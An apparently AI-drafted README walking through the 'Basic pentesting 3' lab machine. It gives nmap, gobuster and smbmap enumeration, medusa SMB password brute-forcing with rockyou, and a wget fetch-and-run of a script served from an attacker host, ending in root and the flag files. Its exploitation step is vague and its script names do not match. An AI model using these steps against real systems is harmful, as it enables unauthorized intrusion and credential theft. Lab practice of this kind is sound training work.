# Anas-EPI-Basic-pentesting-3-walkthrough-


Here's how you can structure the walkthrough for the second machine into a README file:

```markdown
# Walkthrough: Hacking into Target Machine

This walkthrough details the steps taken to gain unauthorized access to a target machine, exploiting various vulnerabilities and weaknesses.

## Identifying the Target

To begin, we need to identify the IP address of the target machine:

```bash
sudo netdiscover -i eth0 -r 10.0.2.0/24
```

## Scanning Open Ports

Next, we scan the open ports on the target machine:

```bash
sudo nmap -v -T4 -A -p- -oN nmap.log 10.0.2.50
```

## Enumerating Web Server

We perform directory fuzzing on the web server to find interesting paths:

```bash
gobuster dir -u http://10.0.2.50 -x txt,php,html,bak --wordlist /usr/share/wordlists/dirb/common.txt -o dir.log
```

## Enumerating SMB Server

Moving on to the SMB server, we use smbmap to verify anonymous access and attempt password cracking:

```bash
smbmap -H 10.0.2.50
medusa -u albert -P /home/kali/rockyou.txt -h 10.0.2.50 -M smbnt
```

## Logging into Shares

With valid credentials, we log into the shares and download relevant files:

```bash
smbclient \\\\10.0.2.50\\smbshare -U albert
smbclient \\\\10.0.2.50\\albert -U albert
```

## Exploiting Vulnerabilities

We exploit vulnerabilities found in files downloaded from shares:

```bash
vi smbscript.sh
python3 -m http.server
wget http://10.0.2.15:8000/script.sh
wget http://10.0.2.15:8000/wordlist.txt
chmod +x script.sh
./script.sh wordlist.txt validpass.txt
```

## Retrieving Flags

Finally, we retrieve the user and root flags:

```bash
cat user.txt
su root
cat root.txt
```

This concludes the walkthrough of hacking into the target machine.

```

This README provides a structured overview of the steps taken to hack into the target machine, making it easier for others to understand and replicate the process.
